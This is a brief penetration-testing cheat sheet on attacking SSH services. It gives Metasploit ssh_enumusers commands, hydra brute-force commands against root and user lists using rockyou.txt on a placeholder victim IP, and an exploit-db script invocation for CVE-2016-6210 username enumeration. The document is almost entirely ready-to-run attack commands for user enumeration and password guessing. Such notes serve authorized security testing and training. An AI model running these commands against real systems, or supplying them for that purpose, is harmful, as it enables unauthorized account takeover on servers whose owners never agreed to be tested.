### SSH 

#### With metasploit
'''
use auxiliary/scanner/ssh/ssh_enumusers
set user_file /usr/share/wordlists/metasploit/unix_users.txt or set user_file /usr/share/seclists/Usernames/Names/names.txt
run
'''

#### Bruteforce with hydra
hydra -v -V -l root -P password-file.txt [victim_ip] ssh
hydra -v -V -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 [victim_ip] ssh

#### User name enumeration against SSH daemons affected by CVE-2016-6210.
- https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/remote/40136.py
##### searchsploit
python /usr/share/exploitdb/exploits/linux/remote/40136.py -U /usr/share/wordlists/metasploit/unix_users.txt [victim_ip]
